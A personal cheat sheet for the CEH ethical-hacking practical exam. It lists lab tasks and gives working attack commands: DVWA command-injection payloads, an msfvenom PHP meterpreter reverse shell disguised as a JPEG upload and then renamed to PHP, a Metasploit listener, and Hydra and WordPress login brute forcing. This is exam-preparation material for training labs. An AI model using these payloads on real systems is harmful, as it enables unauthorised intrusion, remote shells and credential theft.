# CEH_CHEAT_SHEET

1.Sql injection using sqlmap: u need to perform sql injection attack using sqlmap and need to extract password of specific user.

2. You need to check which hosts have rdp enabled. For this u need to perform the port scan on 3389 and then os discovery on open port host and u need to get os of that rdp enabled host.

3. U need to check the mysql service running on which host. Same question 2 technique you need to perform.

3. U need to extract username and password of ftp ( hydra tool u need to use and need to use wordlist placed in desktop wordlist folder)

4. U need to get the password.txt file using veracrypt (disk encryption)

5. U need to get the username and password using wireshark.

6. U need to check bit 3 is true or not using wireshark

7. U need to check the traffic from which port to which port is moving using wireshark

8. U need to decrypt the 3des encryption using cryptool.

9. U need to extract the pin using openstego

10. U need to perform steganalysis on the txt file using snow tool

11. U need to perform brute force on the website using burpsuite ( using intruder)

12. U need to crack hash file using john ( the hash file is located in the responder tool logs file)

13.u need to find the flag file from the ftp. ( for this task bro please use the credentials u cracked in previous challenge)

14. Perform remote os command
 injection (dvwa web) and need to get the content from pin file

15. Perform file upload (dvwa web)

16. U need to compare the hashes using md5 and provide results which file is tampered.

17. Need to crack hash file ( john the ripper)

18. U need to find trojan and need to provide the port of the trojan
19. U need to perform the parameter tamperingo


For 8. The key value will be 11.

U need to perform the cryptanalysis and u have to use the cryptool. Open the cryptool on top, click on encryption / decryption and then click on asymmetric and select tripe des ecb and set 11 11 11 in all. But first please open that file in the tool they ask us to perform the decryption decryption

For this remote command injection attack u need to perform the things a

Snow.exe -C -p “given_password” file_name

| dir c:\ with this command u can see the pin.txt file. But to read the content from this try this command | dir c:\ "pin.txt" or this command ! Take pin.txt

## DVWA 

### WINDOWS - COMMAND INJECTION


Easy - Command Injection 

Execute 127.0.0.1 & & net user
Execute 127.0.0.1 & & net user & & ver command
Execute 127.0.0.1 & & net user & & getmac

Medium - Command Injection 

127.0.0.1&net user
127.0.0.1&net user&sc query&systeminfo
127.0.0.1&;&ipconfig

High - Command Injection

127.0.0.1|net user

### FILE UPLOAD - WINDOWS

msfvenom -p php/meterpreter/reverse_tcp lhost=192.168.1.104 lport=3333 -f raw

type GIF98 before PHP code and save as shell.jpeg.

Copy the uploaded path 

Click on command injectio and type below command
|copy C:\xampp\htdocs\DVWA\hackable\uploads\shell.jpeg
 C:\xampp\htdocs\DVWA\hackable\uploads\aa.php

Msfconsole 
Use multi/handler
Set payload php/meterpreter/reverse_tcp
Set lhost
Set lport
Run



# My experience - 2022 March:

Above material was gathered for preparation, but most of the  content is just useless,So don’t take this seriously, rather you should make your own notes for ILABS videos on youtube. During the exam I have searched many things and even went through the commands manual for finding particular flags and tools to find the answer, so don’t worry if anything is missing in your custom cheatsheet as this is an open book exam. 

Tough questions I had in the exam.

An FTP site is hosted on a machine in a network. Obtain the file “flag.txt” by cracking the credentials of the FTP server and determine the content in this file.
Ftp server was bruteforce easily but the file would not be retrieved as error stated that “Access Denied”. 

An important file has been hidden in the Server 2019 machine in the directory mentioned below. You are an ethical hacker working with a company. You have been assigned the task to retrieve the file “SECRET.txt” using a backdoor that was installed in the server. Enter the secret number hidden in the file. Path: C:\Users\Administrator\Documents\Findme
No clue about this, like where to find the server in the network.

# Note: You can download and install tools If you'll does'nt find required tool on given machine, you can find tools from folder CEH-Tool on given windows machine as well.

## Tools I used .
```
Veracrypt 
Cryptool
Snow
Bctextencoder
Md5 & sha1 checksum utility
Wpscan
Nmap
Metasploit
Hydra
Wireshark
Winscp
OWASP ZAP
RDP
```

## Commands:
```
Net  user
Snow.exe -C -p “given_password” file_name
—---------------------

wpscan --url http://10.10.10.12:8080/CEG --enumerate u
msfconsole
use axiliary/scanner/http/wordpress_login_enum
PASS_FILE /root/Desktop/wordlists/Passwords.txt
set RHOSTs 10.10.10.12
set RPORT 8080
set TARGETURI http://10.10.10.12:8080/CEH/
set USERNAME admin
run

—------------------------
Nmap -Pn -p 21 target > ftp
grep -B 5 open ftp

—--------------------------
Nmap -Pn -p 3389 target > rdp
grep -B 5 open rdp
—-------------------------
Nmap -Pn -p 3306 target > mysql
grep -B 5 open mysql

Hydra -l james -P given_wordlist ftp://target
```

## DVWA - You can change the severity from impossible to easy.
